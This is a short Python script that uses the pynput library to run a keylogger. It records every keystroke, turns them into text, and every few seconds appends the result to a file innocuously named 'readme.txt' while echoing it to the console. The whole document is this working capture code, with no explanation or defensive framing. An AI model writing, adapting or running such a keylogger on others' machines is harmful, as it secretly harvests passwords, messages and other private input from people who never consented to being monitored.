from pynput import keyboard
import time
import threading
special_keybind = {
    'ctrl_l':'ctrl','alt_l':'alt','cmd':'win'
}
timer = time.time()
string = ''
def write():
    global string
    global timer
    while True:
        if int(time.time() - timer) > 5:
            with open('readme.txt', 'a') as f:
                f.write(' ' +string)

            print(string)
            string = ''
            timer = time.time()


def on_press(key):
    global timer
    global string
    print(time.time() - timer)
    timer+=2
    try:
        key = key.char
    except AttributeError:
        key = str(key)
        key = key[4:]
    for keybind_key ,values in special_keybind.items():
        if key == keybind_key:
            key = values

    if key =='space':
        key=' '
    if key == 'backspace':
        string = string[:-1]
        key=''
    string+=key

def on_release(key):
    pass


with keyboard.Listener(on_press=on_press,on_release=on_release) as l:
    threading.Thread(target=write).start()
    l.join()



